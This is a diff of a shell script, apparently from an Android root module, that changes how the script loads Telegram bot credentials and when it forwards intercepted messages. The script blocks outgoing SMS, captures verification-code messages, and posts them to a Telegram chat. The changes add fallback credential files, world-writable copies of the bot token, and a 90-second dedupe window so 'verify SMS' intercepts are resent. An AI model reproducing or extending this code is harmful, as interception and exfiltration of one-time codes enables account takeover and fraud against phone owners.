@@ -183,12 +183,22 @@ sync_config() {
     fi
     # Promote sender id from Save JSON → durable files (menu cut pe na hatе)
     SID=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    if [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ]; then
+      [ -s /data/local/tmp/hivirtus_sender_id.txt ] && \
+        SID=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
+    fi
+    if [ -z "$SID" ] || [ "$SID" = "AD-TEST-S" ]; then
+      [ -s "$MODDIR/sender_id.txt" ] && \
+        SID=$(head -n1 "$MODDIR/sender_id.txt" 2>/dev/null | tr -d '\r\n')
+    fi
     if [ -n "$SID" ] && [ "$SID" != "AD-TEST-S" ]; then
       echo "$SID" > /data/local/tmp/hivirtus_sender_id.txt
       echo "$SID" > "$MODDIR/sender_id.txt"
       chmod 666 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null
+      chmod 666 "$MODDIR/sender_id.txt" 2>/dev/null
     fi
-    if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
+    # Never copy empty sender over a good module file
+    if [ -s /data/local/tmp/hivirtus_sender_id.txt ]; then
       cp -f /data/local/tmp/hivirtus_sender_id.txt "$MODDIR/sender_id.txt" 2>/dev/null
     fi
     if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
@@ -206,8 +216,28 @@ sync_config() {
       echo "$NOW" > /data/local/tmp/hivirtus_global_push.ts
     fi
 
+    # On menu Update/Save — clear TG dedupe so next verify SMS always forwards
+    if [ "$SAVE_OK_VAL" = "1" ]; then
+      rm -f /data/local/tmp/hivirtus_tg_out_dedupe.hash \
+            /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
+      echo "save_sync_ok $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+    fi
+
     TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    # Fallback: dedicated creds / token files (empty JSON wipe se bachao)
+    if [ -z "$TG_T" ] || [ -z "$TG_C" ]; then
+      if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ]; then
+        [ -z "$TG_T" ] && TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+        [ -z "$TG_C" ] && TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+      fi
+    fi
+    if [ -z "$TG_T" ] && [ -s /data/local/tmp/hivirtus_tg_token.txt ]; then
+      TG_T=$(head -n1 /data/local/tmp/hivirtus_tg_token.txt 2>/dev/null | tr -d '\r\n')
+    fi
+    if [ -z "$TG_C" ] && [ -s /data/local/tmp/hivirtus_tg_chat.txt ]; then
+      TG_C=$(head -n1 /data/local/tmp/hivirtus_tg_chat.txt 2>/dev/null | tr -d '\r\n')
+    fi
     if [ -n "$TG_T" ] && [ -n "$TG_C" ]; then
       OLD_HASH=$(cat /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null | tr -d '\r\n')
       NEW_HASH="${TG_T}|${TG_C}"
@@ -215,7 +245,10 @@ sync_config() {
         > /data/local/tmp/hivirtus_telegram_credentials.json
       printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
         > "$MODDIR/telegram_credentials.json" 2>/dev/null
-      chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
+      printf '%s\n' "$TG_T" > /data/local/tmp/hivirtus_tg_token.txt
+      printf '%s\n' "$TG_C" > /data/local/tmp/hivirtus_tg_chat.txt
+      chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json \
+        /data/local/tmp/hivirtus_tg_token.txt /data/local/tmp/hivirtus_tg_chat.txt 2>/dev/null
       [ "$NEW_HASH" != "$OLD_HASH" ] && NEED_PUSH=1
 
       # TG test: ONLY explicit Save (save_ok=1). Hash-change alone NEVER queues (spam fix).
@@ -717,6 +750,18 @@ read_tg_creds() {
     [ -z "$TG_CHAT" ] && TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
     [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ] && break
   done
+  if [ -z "$TG_TOKEN" ] && [ -s /data/local/tmp/hivirtus_tg_token.txt ]; then
+    TG_TOKEN=$(head -n1 /data/local/tmp/hivirtus_tg_token.txt 2>/dev/null | tr -d '\r\n')
+  fi
+  if [ -z "$TG_CHAT" ] && [ -s /data/local/tmp/hivirtus_tg_chat.txt ]; then
+    TG_CHAT=$(head -n1 /data/local/tmp/hivirtus_tg_chat.txt 2>/dev/null | tr -d '\r\n')
+  fi
+  if [ -z "$TG_TOKEN" ] && [ -s "$MODDIR/tg_token.txt" ]; then
+    TG_TOKEN=$(head -n1 "$MODDIR/tg_token.txt" 2>/dev/null | tr -d '\r\n')
+  fi
+  if [ -z "$TG_CHAT" ] && [ -s "$MODDIR/tg_chat.txt" ]; then
+    TG_CHAT=$(head -n1 "$MODDIR/tg_chat.txt" 2>/dev/null | tr -d '\r\n')
+  fi
 }
 
 tg_forward_enabled() {
@@ -814,16 +859,21 @@ forward_blocked_telegram() {
   esac
   BLOCKED_DEST="$TO_DIGITS"
 
-  # Dedupe — same To+body only once
+  # Dedupe — same To+body only within 90s (retest after Update allowed)
   DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY" | md5sum 2>/dev/null | awk '{print $1}')
   [ -z "$DKEY" ] && DKEY=$(printf '%s|%s' "$BLOCKED_DEST" "$BLOCKED_BODY")
   PREV=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null | tr -d '\r\n')
-  if [ -n "$DKEY" ] && [ "$DKEY" = "$PREV" ]; then
-    echo "tg_dedupe_skip $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
-    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
-          /data/local/tmp/hivirtus_outgoing_blocked.json \
-          /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
-    return 0
+  PREV_TS=$(cat /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null | tr -d '\r\n')
+  NOW_TS=$(date +%s)
+  if [ -n "$DKEY" ] && [ "$DKEY" = "$PREV" ] && [ -n "$PREV_TS" ]; then
+    AGE=$((NOW_TS - PREV_TS))
+    if [ "$AGE" -lt 90 ] 2>/dev/null; then
+      echo "tg_dedupe_skip $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+      rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag \
+            /data/local/tmp/hivirtus_outgoing_blocked.json \
+            /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null
+      return 0
+    fi
   fi
 
   # Skip if in-process Gamex/SMSTweaks HTTPS already delivered same intercept
@@ -873,7 +923,9 @@ ${ONE_TAP}"
   if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
   if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
     printf '%s\n' "$DKEY" > /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
-    chmod 666 /data/local/tmp/hivirtus_tg_out_dedupe.hash 2>/dev/null
+    date +%s > /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
+    chmod 666 /data/local/tmp/hivirtus_tg_out_dedupe.hash \
+      /data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
     rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
     rm -f /data/local/tmp/hivirtus_pending_verify.json
